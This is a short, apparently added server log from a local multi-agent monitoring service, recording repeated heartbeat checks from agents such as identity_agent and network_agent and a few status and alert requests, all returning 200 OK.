+INFO:     127.0.0.1:64294 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:10:11] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:64295 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:10:11] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:64296 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:10:11] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:64297 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:10:22] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:64308 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:10:23] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:64309 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:10:23] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:64310 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:10:23] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:64311 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:10:23] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:64312 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:10:23] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:64313 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64426 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:63434 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:55710 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64426 - "GET /system-state HTTP/1.1" 200 OK
+[2026-03-06 13:10:34] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:64320 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:10:35] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:64321 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:10:35] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:64322 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:10:35] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:64323 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:10:35] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:64324 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:10:35] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:64325 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:10:46] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:53789 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:10:47] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:53790 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:10:47] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:53791 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:10:47] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:53792 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:10:47] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:53793 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:10:47] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:53794 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:10:59] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:53802 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:10:59] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:53803 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:10:59] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:53804 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:10:59] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:53805 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:10:59] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:53806 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:11:00] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:53807 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:11:11] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:53814 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:11:11] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:53815 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:11:11] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:53816 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:11:11] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:53817 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:11:11] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:53818 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:11:12] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:53819 - "POST /agent-heartbeat HTTP/1.1" 200 OK
